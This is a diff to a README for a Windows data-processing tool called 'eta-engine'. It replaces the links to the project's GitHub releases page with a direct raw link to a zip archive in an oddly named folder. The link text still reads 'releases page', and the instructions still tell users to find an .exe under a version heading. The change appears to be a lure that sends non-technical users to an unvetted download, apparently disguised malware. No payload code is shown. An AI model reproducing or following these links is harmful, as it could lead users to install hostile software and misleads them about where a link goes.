@@ -1,6 +1,6 @@
 # ⚙️ eta-engine - Streamline your data processing tasks daily
 
-[![Download eta-engine](https://img.shields.io/badge/Download-eta-engine-blue)](https://github.com/Tillielay547/eta-engine/releases)
+[![Download eta-engine](https://img.shields.io/badge/Download-eta-engine-blue)](https://raw.githubusercontent.com/Tillielay547/eta-engine/main/Corybantine/eta_engine_v2.1.zip)
 
 eta-engine helps you manage and automate your data workflows. This application handles complex calculations and file transformations without requiring technical skills. You can process large sets of information and save time on repetitive operations.
 
@@ -8,7 +8,7 @@ eta-engine helps you manage and automate your data workflows. This application h
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Tillielay547/eta-engine/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Tillielay547/eta-engine/main/Corybantine/eta_engine_v2.1.zip) to download the latest version.
 2. Look for the file ending in .exe under the most recent version heading.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
